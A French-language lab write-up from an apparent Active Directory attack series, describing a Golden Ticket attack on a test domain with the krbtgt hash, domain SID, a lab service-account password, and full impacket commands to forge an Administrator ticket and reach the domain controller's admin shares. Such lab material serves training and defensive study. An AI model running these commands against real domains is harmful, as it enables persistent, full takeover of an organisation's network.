## Attaque

### Contexte

Avec le hash de `krbtgt` obtenu au scénario 08, l'attaquant peut forger un ticket
Kerberos valide pour n'importe quel compte du domaine. Windows fait confiance à ce
ticket car il est signé avec le vrai hash de `krbtgt`.

> Dans ce lab Kali partage le réseau avec le DC, ce qui permet de lancer l'attaque directement. En conditions réelles elle serait exécutée depuis la machine compromise via Rubeus, ou depuis le C2 via un tunnel SOCKS.

### Technique MITRE

| ID | Technique | Tactique |
|----|-----------|----------|
| T1558.001 | Golden Ticket | Persistence, Privilege Escalation |

### Prérequis

| Élément | Valeur |
|---------|--------|
| Hash krbtgt | f51548c3f921c9480cec9df614d313d9 |
| SID du domaine | S-1-5-21-3040434355-1221042967-3066659209 |

### Exécution

#### 1. Récupérer le SID du domaine

```bash
impacket-lookupsid lab.local/svc-sync:'P@ssw0rd123'@192.168.10.100 | grep "Domain SID"
```

#### 2. Forger le Golden Ticket

```bash
impacket-ticketer -nthash f51548c3f921c9480cec9df614d313d9 -domain-sid S-1-5-21-3040434355-1221042967-3066659209 -domain lab.local -groups 512 Administrator
```

| Option | Signification |
|--------|--------------|
| `-nthash` | Hash NTLM de krbtgt récupéré au scénario 08 |
| `-domain-sid` | SID du domaine |
| `-domain` | Nom du domaine |
| `-groups 512` | Domain Admins |
| `Administrator` | Compte usurpé |

![](../../sceenshots/golden_ticket_forge.png)

#### 3. Activer le ticket

```bash
export KRB5CCNAME=Administrator.ccache
```

#### 4. Accéder à DC01

```bash
impacket-smbclient -k -no-pass lab.local/Administrator@DC01.lab.local
```

| Option | Signification |
|--------|--------------|
| `-k` | Authentification Kerberos, utilise le ticket exporté |
| `-no-pass` | Pas de mot de passe, le ticket suffit |
| `lab.local/Administrator@DC01.lab.local` | Domaine, compte usurpé, cible |

![](../../sceenshots/golden_ticket_access.png)

### Résultat

Accès aux partages administratifs de DC01 (`ADMIN$`, `C$`) en tant qu'Administrator
sans connaître son mot de passe. L'attaquant a un accès complet au DC.

